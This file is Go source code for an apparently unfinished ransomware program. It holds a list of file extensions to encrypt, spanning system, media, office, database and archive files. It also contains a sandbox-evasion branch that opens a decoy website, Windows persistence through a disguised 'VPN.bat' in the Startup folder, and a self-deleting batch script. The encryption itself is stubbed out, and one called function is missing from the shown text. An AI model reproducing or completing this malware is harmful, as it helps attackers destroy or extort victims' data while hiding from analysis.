package main

import (
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
)

var (
	// List of extensions which will be encrypted
	extensions = []string{
		"exe", "dll", "so", "rpm", "deb", "vmlinuz", "img", // SYSTEM FILES
		"JPEG", "jpg", "bmp", "gif", "png", "svg", "psd", "raw", // images
		"mp3", "mp4", "m4a", "aac", "ogg", "flac", "wav", "wma", "aiff", "ape", // music and sound
		"avi", "flv", "m4v", "mkv", "mov", "mpg", "mpeg", "wmv", "swf", "3gp", // Video and movies

		"doc", "docx", "xls", "xlsx", "ppt", "pptx", // MS office
		"odt", "odp", "ods", "txt", "rtf", "tex", "pdf", "epub", "md", // OpenOffice, Adobe, Latex, Markdown, etc
		"yml", "yaml", "json", "xml", "csv", // structured data
		"db", "sql", "dbf", "mdb", "iso", // databases and disc images

		"html", "htm", "xhtml", "php", "asp", "aspx", "js", "jsp", "css", // web

		"zip", "tar", "tgz", "bz2", "7z", "rar", "bak", // archives
	}

	// Get the path to executable
	filePath, _ = os.Executable()
	// Get the OS
	runtimeOS = runtime.GOOS

	// Get dir info
	userDir, _ = os.UserHomeDir()
)

func letItBurn(presents bool) {
	// If presents detected - retreat
	if presents {
		retreat()
	} else {
		fmt.Println("Oh, nooo!Work again?! \nDobby will never be free...")
		// Add exe to autorun using the bat file
		addToAutoRun(false)
		for true {
			if !isEncrypted() {
				fmt.Println("This part should encrypt!")
			} else if isEncrypted() {
				fmt.Println("Show ransomware and decrypt")
			}
		}
		removeItself()
	}
	os.Exit(0)
}

// If detect the present of debugger or sandbox - does not do anyhing suspicious
func retreat() {
	url := "https://google.com"
	if runtimeOS == "windows" {
		_ = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
	} else if runtimeOS == "linux" {
		_ = exec.Command("xdg-open", url).Start()
	}
}

// For Windows OS add to Autorun using folder
func addToAutoRun(status bool) {
	if runtimeOS == "windows" {
		userName, _ := user.Current()
		batPath := userName.HomeDir + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
		if status {
			err := os.Remove(batPath + "\\" + "VPN.bat")
			if err != nil {
				fmt.Println("Error in the deletion process: " + err.Error())
				os.Exit(1)
			}
		} else {
			file, _ := os.OpenFile(batPath+"\\"+"VPN.bat", os.O_CREATE|os.O_RDWR, 0700)
			_, _ = file.Write([]byte("start \"\" \"" + filePath + "\""))
			file.Close()
		}
	}
}

// Checking if file was encrypted
func isEncrypted() bool {
	return false
}

// Removing malware
func removeItself() {
	if runtimeOS == "windows" {
		if file, err := os.OpenFile("VPN.bat", os.O_CREATE|os.O_RDWR, 0755); err == nil {
			_, _ = file.Write([]byte("@ECHO OFF\ntimeout /t 5 /nobreak > NUL\n" +
				"type nul > \"" + filePath + "\"\n" +
				"DEL /q /s \"" + filePath + "\"\n" +
				"type nul > \"" + filepath.Dir(filePath) + string(os.PathSeparator) + "VPN.bat" + "\"\n" +
				"DEL /q /s \"" + filepath.Dir(filePath) + string(os.PathSeparator) + "VPN.bat" + "\""))
			file.Close()
			batFile := filepath.Dir(filePath) + string(os.PathSeparator) + "VPN.bat"
			cmd := exec.Command("C:\\Windows\\System32\\cmd.exe", "/C", batFile)
			_ = cmd.Start()
		}
	}
}

func main() {
	if checkPresents() {
		letItBurn(true)
	}
	letItBurn(false)
}
